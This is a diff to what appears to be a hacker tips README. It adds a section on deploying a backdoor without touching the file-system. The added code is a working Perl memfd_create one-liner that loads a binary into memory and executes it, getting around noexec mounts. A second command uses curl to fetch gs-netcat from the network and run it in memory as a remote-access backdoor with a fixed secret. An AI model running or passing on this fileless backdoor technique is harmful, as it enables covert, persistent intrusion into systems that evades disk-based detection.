@@ -85,6 +85,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Make a file immutable](#perm-files)
    1. [Change user without sudo/su](#nosudo)
    1. [Obfuscate and crypt payload](#payload)
+   1. [Circumvent noexec mount flags](#memexec)
 1. [Crypto](#crypto)
    1. [Generate quick random Password](#gen-password)
    1. [Linux transportable encrypted filesystems](#crypto-filesystem)
@@ -2010,6 +2011,34 @@ upx -d "${BIN}"  # Should fail with 'not packed by UPX'
 ```
 
 Optionally encrypt it with [Ezuri](https://github.com/guitmz/ezuri) thereafter.
+
+**8.viii. Deploying a backdoor without touching the file-system**
+
+How to start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.
+
+A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp).
+```sh
+memexec() {
+    local stropen strread
+    local strargv0='"foo", '
+    [ -t 0 ] && {
+        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
+        strread='$i'
+        unset strargv0
+    }
+    perl -e '$f=syscall(319, $n="", 1);
+if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
+'"${stropen}"'
+open($o, ">&=".$f) or die "open: $!";
+while(<'"${strread:-STDIN}"'>){print $o $_;}
+exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
+}
+```
+
+Deploy gsocket (example):
+```sh
+GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m))
+```
 
 ---
 <a id="crypto"></a>
